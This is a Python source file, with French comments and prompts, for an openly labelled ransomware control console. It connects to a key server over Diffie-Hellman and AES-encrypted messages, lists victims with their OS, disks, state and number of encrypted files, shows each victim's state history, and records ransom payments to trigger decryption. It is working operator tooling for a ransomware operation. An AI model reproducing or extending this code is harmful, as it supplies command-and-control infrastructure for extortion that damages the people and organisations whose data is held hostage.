import socket
from datetime import datetime
import utile.network as network
import utile.message as message
import utile.security as security
#import utile.config as config
#import utile.input as my_input


# Constantes
IP_SERV_CONSOLE = socket.gethostname()
PORT_SERV_CONSOLE = 8380


def format_timestamp(timestamp):
    # Convertir le timestamp en objet datetime
    dt_object = datetime.fromtimestamp(timestamp)
    # Formater la date selon le format souhaité
    formatted_date = dt_object.strftime("%d/%m/%Y %H:%M:%S")

    return formatted_date


def affichage_menu():
    print("")
    print("============================================================================")
    print("CONSOLE DE CONTROLE DU RANSOMWARE")
    print("============================================================================")
    print("1) Liste de victimes du ransomware")
    print("2) Historiques des états d'une victime")
    print("3) Renseigner le payement de rançon d'une victime")
    print("4) Quitter")


def affichage_liste_victimes():
    print("")
    print("============================================================================")
    print("LISTING DES VICTIMES DU RANSOMWARE")
    print("============================================================================")
    try:
        # Connexion au serveur
        s = network.connect_to_serv(network.LOCAL_IP, network.PORT_SERV_CLES, retry=10)
        key = security.diffie_hellman_send_key(s)
        msg = message.set_message("LIST_REQ")
        encrypted_msg = security.aes_encrypt(msg, key)
        network.send_message(s, encrypted_msg)

        while True:
            response_encrypted = network.receive_message(s)
            if not response_encrypted:
                break  # Si aucune réponse n'est reçue, sortir de la boucle
            response = security.aes_decrypt(response_encrypted, key)

            if response is None:
                print("Aucune réponse reçue.")
                return
            elif response is not None and message.get_message_type(response) != 'LIST_END':
                data = list(response.values())
                print(
                    f"ID : {data[0]} | HASH: {data[1]} | OS: {data[2]} | Disks: {data[3]} | State: {data[4]} | Nb_files: {data[5]}")

            else:
                break  # Si c'est la fin de la liste, sortir de la boucle
    except Exception as e:
        print(f"Erreur lors de la communication avec le serveur : {e}")
    finally:
        if s:
            s.close()
            if s._closed:
                print("Connexion fermée avec le serveur.")
            else:
                print("Erreur lors de la fermeture de la connexion avec le serveur.")


def affichage_historique_etat_victime():
    print("")
    print("============================================================================")
    print("HISTORIQUE DES ETATS DE LA VICTIME")
    print("============================================================================")
    try:
        # Connexion au serveur de clés
        s = network.connect_to_serv(network.LOCAL_IP, network.PORT_SERV_CLES, retry=10)
        key = security.diffie_hellman_send_key(s)

        # Récupération de l'id de la victime
        victim_id = int(input("Entrez le numéro de la victime : "))

        # Envoi de la requête
        msg = message.set_message("HIST_REQ", [victim_id])
        encrypted_msg = security.aes_encrypt(msg, key)
        network.send_message(s, encrypted_msg)

        # Récupération de la réponse
        while True:
            response_encrypted = network.receive_message(s)
            if not response_encrypted:
                break  # Si aucune réponse n'est reçue, sortir de la boucle
            response = security.aes_decrypt(response_encrypted, key)

            if response is None:
                print("Aucune réponse reçue.")
                return
            elif response is not None and message.get_message_type(response) != 'HIST_END':
                data = list(response.values())
                print(
                    f"ID_STATES: {data[0]} | ID_VICTIM: {data[1]} | TIMESTAMP: {format_timestamp(data[2])} | STATE: {data[3]}")
            else:
                break
    except Exception as e:
        print(f"Erreur lors de la communication avec le serveur : {e}")
    finally:
        if s:
            s.close()
            if s._closed:
                print("Connexion fermée avec le serveur.")
            else:
                print("Erreur lors de la fermeture de la connexion avec le serveur.")


def affichage_payement_rancon():
    print("")
    print("")
    print("RENSEIGNER LE PAYEMENT DE RANCON D'UNE VICTIME")
    print("______________________________________________")
    try:
        # Connexion au serveur de clés
        s = network.connect_to_serv(network.LOCAL_IP, network.PORT_SERV_CLES, retry=10)
        print("Connexion au serveur établie.")

        key = security.diffie_hellman_send_key(s)
        print("Clé partagée échangée avec succès.")

        # Récupération de l'id de la victime
        victim_id = int(input("Entrez le numéro de la victime : "))
        print(f"ID de la victime entré : {victim_id}")

        # Envoi de la requête
        msg = message.set_message("DECRYPT", [victim_id, None, None])
        encrypted_msg = security.aes_encrypt(msg, key)
        network.send_message(s, encrypted_msg)
        print("Requête de changement d'état envoyée.")

        # Attente de la réponse
        response = network.receive_message(s)
        print("Réponse reçue du serveur.")

        if not response:
            print("Aucune réponse reçue.")
            return

        response = security.aes_decrypt(response, key)
        print("Réponse déchiffrée avec succès.")

        # Affichage de la réponse en fonction de l'état de la victime
        chgstate_value = response.get('CHGSTATE')

        if chgstate_value == "DECRYPT":
            print(f"La victime {victim_id} a payé la rançon. Décryptage en cours...")
        elif chgstate_value == "DECRYPTED":
            print(f"La victime {victim_id} a déjà payé et est en cours de décryptage.")
        else:
            print(f"La victime {victim_id} est dans l'état {chgstate_value} et donc nous ne pouvons pas la décrypter.")
    except Exception as e:
        print(f"Erreur lors de la communication avec le serveur : {e}")
    finally:
        if s:
            s.close()
            if s._closed:
                print("Connexion fermée avec le serveur.")
            else:
                print("Erreur lors de la fermeture de la connexion avec le serveur.")


def main():
    continuer = True
    while continuer:
        affichage_menu()
        choix_user = input("Votre choix : ")
        if choix_user == "1":
            affichage_liste_victimes()
        elif choix_user == "2":
            affichage_historique_etat_victime()
        elif choix_user == "3":
            affichage_payement_rancon()
        elif choix_user == "4":
            continuer = False
            print("Au revoir")
        else:
            print("Choix invalide. Veuillez entrer un nombre entre 1 et 4.")
    exit(0)


if __name__ == '__main__':
    main()
